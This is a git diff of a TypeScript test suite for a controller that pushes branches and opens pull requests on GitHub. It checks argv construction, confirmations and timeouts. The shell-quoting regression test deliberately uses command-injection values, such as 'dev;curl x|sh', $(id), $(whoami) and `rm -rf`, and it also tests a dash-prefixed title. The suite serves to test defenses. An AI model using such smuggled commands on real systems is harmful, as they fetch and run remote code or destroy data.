@@ -16,7 +16,8 @@ import { controlRoutes } from './controls.ts'
 import { CONTROLS_PREFIX, loadControlsConfig } from './controlsGuard.ts'
 import type { SpawnFn } from './controlsRunner.ts'
 import {
-  GITHUB_ACTIONS_OFF, GITHUB_READ_FAILED, GITHUB_READ_MISSING, githubStateToken, isBranchName, isReviewerName, reviewerSuggestions, urlOf, type GithubSource,
+  GITHUB_ACTION_TIMEOUT_MS, GITHUB_ACTIONS_OFF, GITHUB_READ_FAILED, GITHUB_READ_MISSING, GITHUB_UNKNOWN_NOTE, githubDisplay, githubStateToken, isBranchName, isReviewerName,
+  reviewerSuggestions, shellQuote, summaryDefaults, truncateBytes, urlOf, validateGithubParams, githubActionsOf, type GithubSource,
 } from './githubActions.ts'
 import { RunStore } from './projects.ts'
 import { parseProjectsConfig } from './projectsConfig.ts'
@@ -152,7 +153,7 @@ function recorder() {
   return { calls, children, answers, spawn }
 }
 
-async function rig(options: { actions?: boolean; source?: FakeSource | null; controls?: boolean } = {}) {
+async function rig(options: { actions?: boolean; source?: FakeSource | null; controls?: boolean; githubTimeoutMs?: number } = {}) {
   const root = await mkdtemp(join(tmpdir(), 'md-manager-ghactions-'))
   const home = join(root, 'home')
   const wfhome = join(root, 'wfhome')
@@ -183,7 +184,12 @@ async function rig(options: { actions?: boolean; source?: FakeSource | null; con
   const spawner = recorder()
   const source = options.source === undefined ? new FakeSource() : options.source
   const app: FastifyInstance = Fastify({ logger: false })
-  await app.register(controlRoutes, { prefix: CONTROLS_PREFIX, store, setup, now: () => NOW, runner: { spawn: spawner.spawn, systemdRun: true }, ...(source ? { github: source } : {}) })
+  // A fake kill: a bound child is "killed" by emitting its exit, never by signalling a real process group.
+  const kill = (pid: number, signal: NodeJS.Signals) => { spawner.children.find(child => child.pid === pid)?.emit('exit', null, signal) }
+  await app.register(controlRoutes, {
+    prefix: CONTROLS_PREFIX, store, setup, now: () => NOW, runner: { spawn: spawner.spawn, systemdRun: true, kill }, ...(source ? { github: source } : {}),
+    ...(options.githubTimeoutMs !== undefined ? { githubTimeoutMs: options.githubTimeoutMs } : {}),
+  })
   await seedRun(runsRoot, 'done', true)
   await seedRun(runsRoot, 'live', false)
   await app.ready()
@@ -214,6 +220,9 @@ async function withRig(options: Parameters<typeof rig>[0], body: (r: Awaited<Ret
 const actionOf = (view: RunGithubActions, id: GithubActionId) => view.actions.find(action => action.id === id)!
 const errorOf = (response: { json: () => unknown }) => controlErrorSchema.parse(response.json()).error
 const BY = ['--by', 'operator']
+const BRANCH = 'feature/relayer-revert-shapes/run-001'
+const CONFIRMED = ['--repo-name', 'kleros/vea', '--branch', BRANCH, '--head', HEAD]
+const SHOWN = `"$RUN" --repo ~/dev/widgets --repo-name kleros/vea --branch ${BRANCH} --head ${HEAD}`
 
 // ---- Offers -------------------------------------------------------------------------------------------------------------------
 
@@ -248,7 +257,7 @@ test('[offers] the matrix: push on a public repo asks for the repo typed, a priv
     assert.equal(push.confirm, 'typed_repo')
     assert.deepEqual(push.params, [{ name: 'confirm_repo', kind: 'typed', required: true }])
     assert.equal(push.publishes, '3 commits (with author names and emails) become public on kleros/vea')
-    assert.equal(push.command, `$PY -m workflow github push "$RUN" --repo ~/dev/widgets --sha ${HEAD.slice(0, 12)} --by operator`)
+    assert.equal(push.command, `$PY -m workflow github push ${SHOWN} --by operator`)
     assert.equal(actionOf(view, 'open_pr').reason, 'Push the branch first: GitHub does not have the run branch at its head')
     assert.equal(actionOf(view, 'mark_ready').reason, 'No pull request is open for this branch')
     assert.equal(actionOf(view, 'request_reviewers').reason, 'No pull request is open for this branch')
@@ -280,7 +289,7 @@ test('[offers] the matrix: push on a public repo asks for the repo typed, a priv
     assert.match(open.defaults.body!, /^### Widgets: done\n/)
     assert.match(open.defaults.body!, /\*\*Branch:\*\* `feature\/relayer-revert-shapes\/run-001`/)
     assert.ok(!open.defaults.body!.includes(r.home), 'no home path in the generated body')
-    assert.equal(open.command, '$PY -m workflow github pr "$RUN" --repo ~/dev/widgets --base dev --title <title> --body-file <body> --by operator')
+    assert.equal(open.command, `$PY -m workflow github pr ${SHOWN} --base dev --title=<title> --body-file <body> --by operator`)
 
     source.read_ = readOf('draft')
     view = await r.view()
@@ -318,26 +327,26 @@ test('[argv] each action runs exactly one fixed controller command, as the opera
     r.spawner.answers.push({ output: `Pushed ${HEAD.slice(0, 12)} to kleros/vea refs/heads/x (new branch).\n`, code: 0 })
     let response = await r.act('done', 'push_branch', { confirm_repo: 'kleros/vea' })
     assert.equal(response.statusCode, 200, response.body)
-    assert.deepEqual(r.spawner.calls[0].args, ['-m', 'workflow', 'github', 'push', runDir, '--repo', r.repository, '--sha', HEAD, ...BY])
+    assert.deepEqual(r.spawner.calls[0].args, ['-m', 'workflow', 'github', 'push', runDir, '--repo', r.repository, ...CONFIRMED, ...BY])
     assert.equal(r.spawner.calls[0].command, r.python)
     assert.equal(r.spawner.calls[0].shell, false)
 
     source.read_ = readOf('pushed')
     r.spawner.answers.push({ output: 'Creating draft pull request\nhttps://github.com/kleros/vea/pull/532\n', code: 0 })
-    response = await r.act('done', 'open_pr', { title: 'Widgets: done', body: 'Body\n\nwith `code`', confirm_repo: 'kleros/vea' })
+    response = await r.act('done', 'open_pr', { title: '-WIP- Widgets: done', body: 'Body\n\nwith `code`', confirm_repo: 'kleros/vea' })
     assert.equal(response.statusCode, 200, response.body)
     const pr = r.spawner.calls[1].args
     const bodyFile = pr[pr.indexOf('--body-file') + 1]
-    assert.deepEqual(pr, ['-m', 'workflow', 'github', 'pr', runDir, '--repo', r.repository, '--base', 'dev', '--title', 'Widgets: done', '--body-file', bodyFile, ...BY])
+    assert.deepEqual(pr, ['-m', 'workflow', 'github', 'pr', runDir, '--repo', r.repository, ...CONFIRMED, '--base', 'dev', '--title=-WIP- Widgets: done', '--body-file', bodyFile, ...BY])
 
     source.read_ = readOf('draft')
     response = await r.act('done', 'mark_ready')
     assert.equal(response.statusCode, 200, response.body)
-    assert.deepEqual(r.spawner.calls[2].args, ['-m', 'workflow', 'github', 'ready', runDir, '--repo', r.repository, '--pr', '531', ...BY])
+    assert.deepEqual(r.spawner.calls[2].args, ['-m', 'workflow', 'github', 'ready', runDir, '--repo', r.repository, ...CONFIRMED, '--pr', '531', ...BY])
 
     response = await r.act('done', 'request_reviewers', { reviewers: ['jaybuidl', ' kleros/vea-maintainers', 'jaybuidl'] })
     assert.equal(response.statusCode, 200, response.body)
-    assert.deepEqual(r.spawner.calls[3].args, ['-m', 'workflow', 'github', 'reviewers', runDir, '--repo', r.repository, '--pr', '531', '--add', 'jaybuidl,kleros/vea-maintainers', ...BY])
+    assert.deepEqual(r.spawner.calls[3].args, ['-m', 'workflow', 'github', 'reviewers', runDir, '--repo', r.repository, ...CONFIRMED, '--pr', '531', '--add', 'jaybuidl,kleros/vea-maintainers', ...BY])
     assert.equal(r.spawner.calls.length, 4)
     for (const call of r.spawner.calls) {
       assert.ok(!call.args.some(arg => arg === '--force' || arg === '-f' || arg.startsWith('+')))
@@ -361,7 +370,7 @@ test('[records] the record validates, keeps body_chars not the body, extracts th
     assert.equal(record.status, 'succeeded')
     assert.equal(record.exit_code, 0)
     assert.equal(record.url, 'https://github.com/kleros/vea/pull/532')
-    assert.equal(record.command, '$PY -m workflow github pr "$RUN" --repo ~/dev/widgets --base dev --title "Widgets: done" --body-file <body> --by operator')
+    assert.equal(record.command, `$PY -m workflow github pr ${SHOWN} --base dev '--title=Widgets: done' --body-file <body> --by operator`)
     assert.deepEqual(source.due, [`${PROJECT}/${WORKFLOW}/done`])
     const stored = await readFile(join(r.stateDir, PROJECT, WORKFLOW, 'done.github.jsonl'), 'utf8')
     assert.ok(!stored.includes('Secret-free body'), 'the body text is never kept')
@@ -527,4 +536,148 @@ test('the default PR body says when a lane worked as a team (worker session reco
   assert.deepEqual(input.lanes.find(lane => lane.lane === 'ui')?.team, { workflows: 2, agents: 8, failed: 1 })
   assert.equal(input.lanes.find(lane => lane.lane === 'server')?.team, null)
   assert.equal(summaryInput(loaded, 'feature-implementation', null).lanes[0].team, null, 'without a team read every lane is single-session')
+})
+
+// ---- Review-swarm regressions (F3.1-F3.9, F7.3) -------------------------------------------------------------------------------
+
+test('[F3.7] a read whose last refresh failed (reason set) offers no action, whatever its data says', async () => {
+  await withRig({}, async r => {
+    const stale = readOf('pushable')
+    stale.github.reason = 'gh is not logged in'
+    r.source!.read_ = stale
+    const view = await r.view()
+    for (const action of view.actions) {
+      assert.equal(action.available, false, action.id)
+      assert.equal(action.reason, 'GitHub\'s facts for kleros/vea are not current (gh is not logged in); the actions wait for a fresh read')
+    }
+  })
+})
+
+test('[F3.1] push and open_pr follow GitHub\'s own branch head, not only the last fetch', async () => {
+  await withRig({}, async r => {
+    const deleted = readOf('pushed')
+    deleted.branch.github_sha = null
+    r.source!.read_ = deleted
+    let view = await r.view()
+    assert.equal(actionOf(view, 'push_branch').reason, `GitHub no longer has the run branch (the last fetch still shows it at ${HEAD.slice(0, 12)}); fetch with --prune and look again`)
+    assert.equal(actionOf(view, 'open_pr').reason, 'Push the branch first: GitHub does not have the run branch at its head')
+
+    const elsewhere = readOf('pushed')
+    elsewhere.branch.github_sha = 'e'.repeat(40)
+    r.source!.read_ = elsewhere
+    view = await r.view()
+    assert.equal(actionOf(view, 'push_branch').reason, 'GitHub has the run branch at eeeeeeeeeeee, which the last fetch did not see; fetch and look before pushing')
+    assert.equal(actionOf(view, 'open_pr').reason, `GitHub has the run branch at eeeeeeeeeeee, not at its local head ${HEAD.slice(0, 12)}`)
+
+    const unfetched = readOf('pushable')
+    unfetched.branch.github_sha = HEAD
+    r.source!.read_ = unfetched
+    assert.equal(actionOf(await r.view(), 'push_branch').reason, 'The branch is already on GitHub at the same commit')
+  })
+})
+
+test('[F3.8] push is not offered when the branch no longer contains the integrated commit', async () => {
+  await withRig({}, async r => {
+    const rewritten = readOf('pushable')
+    rewritten.branch.contains_integrated = false
+    r.source!.read_ = rewritten
+    assert.equal(actionOf(await r.view(), 'push_branch').reason, 'The run branch no longer contains the run\'s integrated commit; only the integrated branch is pushed')
+    const refused = await r.act('done', 'push_branch', { confirm_repo: 'kleros/vea' })
+    assert.equal(refused.statusCode, 422)
+    assert.equal(r.spawner.calls.length, 0)
+  })
+})
+
+test('[F3.4] PR actions are offered only for the pull request at the run branch\'s local head; every argv carries the confirmed head', async () => {
+  await withRig({}, async r => {
+    const moved = readOf('draft')
+    moved.pr!.head_sha = 'f'.repeat(40)
+    r.source!.read_ = moved
+    let view = await r.view()
+    assert.equal(actionOf(view, 'mark_ready').reason, `Pull request #531 is at ffffffffffff, not at the run branch's local head ${HEAD.slice(0, 12)}`)
+    assert.equal(actionOf(view, 'request_reviewers').reason, actionOf(view, 'mark_ready').reason)
+    const unknownHead = readOf('draft')
+    unknownHead.pr!.head_sha = null
+    r.source!.read_ = unknownHead
+    view = await r.view()
+    assert.equal(actionOf(view, 'mark_ready').reason, 'GitHub did not report the head of pull request #531')
+    const short = readOf('draft')
+    short.branch.local_sha = HEAD.slice(0, 12)
+    r.source!.read_ = short
+    for (const action of (await r.view()).actions) assert.equal(action.reason, 'The run branch\'s head is not recorded in full', action.id)
+  })
+})
+
+test('[F3.5] the state token follows the branch name, the default branch and the read\'s state', () => {
+  const read = readOf('pushed')
+  const token = githubStateToken(read, 'succeeded')
+  const renamed = structuredClone(read)
+  renamed.branch.name = 'feature/other/run-001'
+  const based = structuredClone(read)
+  based.repo.default_branch = 'main'
+  const failing = structuredClone(read)
+  failing.github.reason = 'gh is not logged in'
+  for (const changed of [renamed, based, failing]) assert.notEqual(githubStateToken(changed, 'succeeded'), token)
+})
+
+test('[F3.9] the default body fits the byte limit it is checked against, also for multibyte text', () => {
+  assert.equal(truncateBytes('short', 60000), 'short')
+  const ascii = truncateBytes('x'.repeat(70000), 60000)
+  assert.equal(Buffer.byteLength(ascii, 'utf8'), 60000)
+  assert.ok(ascii.endsWith('…\n'))
+  const wide = truncateBytes('é'.repeat(40000) + '😀'.repeat(10), 60000)
+  assert.ok(Buffer.byteLength(wide, 'utf8') <= 60000)
+  assert.ok(!wide.includes('�'))
+  const loaded = {
+    detail: { summary: { run_id: 'run-001', status: 'succeeded', activity: null } }, review: null, claudeUsd: null,
+    inputs: { feature: 'Widgets', source_branch: BRANCH, base_commit: null, workers: [{ node_id: 'ui', completion: { summary: 'é'.repeat(40000) } }] },
+  } as unknown as Parameters<typeof summaryDefaults>[0]
+  const { body } = summaryDefaults(loaded, WORKFLOW, null)
+  assert.ok(Buffer.byteLength(body, 'utf8') <= 60000, `${Buffer.byteLength(body, 'utf8')} bytes`)
+  const [open] = githubActionsOf({
+    enabled: true, read: readOf('pushed'), readReason: null, runStatus: 'succeeded', repositoryShown: '~/dev/widgets', suggestions: [], defaults: { title: 'T', body },
+  }).filter(action => action.id === 'open_pr')
+  assert.equal(validateGithubParams(open, { title: 'T', body, confirm_repo: 'kleros/vea' }, 'kleros/vea').body, body)
+})
+
+test('[F3.6] the copyable command shell-quotes every value the server fills in', () => {
+  const read = readOf('pushed')
+  read.repo.default_branch = 'dev;curl x|sh'
+  read.branch.name = 'feature/$(id)/run-001'
+  const shown = githubDisplay('open_pr', "~/dev/it's here", read, { title: 'Fix `rm -rf` $(whoami) it\'s' })
+  assert.equal(shown, `$PY -m workflow github pr "$RUN" --repo ~/'dev/it'\\''s here' --repo-name kleros/vea --branch 'feature/$(id)/run-001' --head ${HEAD} `
+    + `--base 'dev;curl x|sh' '--title=Fix \`rm -rf\` $(whoami) it'\\''s' --body-file <body> --by operator`)
+  assert.equal(shellQuote('kleros/vea'), 'kleros/vea')
+  assert.equal(shellQuote(''), "''")
+})
+
+test('[F3.2] a title starting with a dash is one --title= element', async () => {
+  await withRig({}, async r => {
+    r.source!.read_ = readOf('pushed')
+    r.spawner.answers.push({ output: 'https://github.com/kleros/vea/pull/532\n', code: 0 })
+    assert.equal((await r.act('done', 'open_pr', { title: '--draft', body: 'B', confirm_repo: 'kleros/vea' })).statusCode, 200)
+    const args = r.spawner.calls[0].args
+    assert.ok(args.includes('--title=--draft'))
+    assert.ok(!args.includes('--title'))
+  })
+})
+
+test('[F7.3] a GitHub action outlives no bound shorter than the controller\'s worst case; a cut-off or exit-3 action is told as unknown', async () => {
+  assert.ok(GITHUB_ACTION_TIMEOUT_MS > (180 + 120) * 1000, 'above the controller\'s 180 s reads plus its 120 s write')
+  await withRig({ githubTimeoutMs: 30 }, async r => {
+    r.source!.read_ = readOf('pushed')
+    r.spawner.answers.push({ output: 'Creating draft pull request\n', code: null })
+    const record = githubActionResponseSchema.parse((await r.act('done', 'open_pr', { title: 'T', body: 'B', confirm_repo: 'kleros/vea' })).json()).record
+    assert.equal(record.status, 'failed')
+    assert.equal(record.output_tail.at(-1), GITHUB_UNKNOWN_NOTE)
+    assert.match(GITHUB_UNKNOWN_NOTE, /may have been published; check GitHub/)
+    assert.deepEqual(r.source!.due, [`${PROJECT}/${WORKFLOW}/done`], 'the branch is read again')
+
+    r.source!.read_ = readOf('pushable')
+    r.spawner.answers.push({ output: 'Unknown: git push did not finish within 120 s and was stopped: it may have been published; check GitHub\n', code: 3 })
+    const unknown = githubActionResponseSchema.parse((await r.act('done', 'push_branch', { confirm_repo: 'kleros/vea' })).json()).record
+    assert.deepEqual([unknown.status, unknown.exit_code], ['failed', 3])
+    assert.match(unknown.output_tail[0], /^Unknown: /)
+    assert.equal(r.source!.due.length, 2)
+  })
 })
